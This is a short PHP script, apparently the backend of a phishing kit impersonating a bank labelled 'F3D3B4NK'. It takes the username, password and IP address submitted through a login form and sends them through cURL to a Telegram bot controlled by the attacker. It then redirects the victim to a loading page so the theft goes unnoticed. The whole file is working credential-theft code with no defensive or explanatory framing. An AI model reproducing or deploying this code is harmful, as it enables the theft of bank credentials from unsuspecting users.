<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Recoger los datos del formulario
    $usuario = $_POST['user'];
    $clave = $_POST['Clave'];
    $ip = $_SERVER['REMOTE_ADDR'];
   
   
 
    
    include "tg.php";
 // Mensaje a enviar a Telegram
    $mensaje = "F3D3B4NK:\nUsuario: $usuario\nClave: $clave\nIP cliente: $ip";

    $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

    // Datos para enviar a la API de Telegram
    $postData = array(
        'chat_id' => $chatId,
        'text' => $mensaje
    );

    // Inicializar cURL
    $ch = curl_init($telegramApiUrl);

    // Configurar cURL para enviar una solicitud POST
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Ejecutar la solicitud cURL y obtener la respuesta
    $response = curl_exec($ch);

    // Cerrar la sesión cURL
    curl_close($ch);

    // Redirigir de nuevo a la página de formulario o mostrar un mensaje de éxito
    header('Location: ../carga.html');
    exit();
} else {
    // Si alguien intenta acceder directamente a esta página sin enviar el formulario, redirigir a la página de inicio
    header('Location: index.html');
    exit();
}
?>
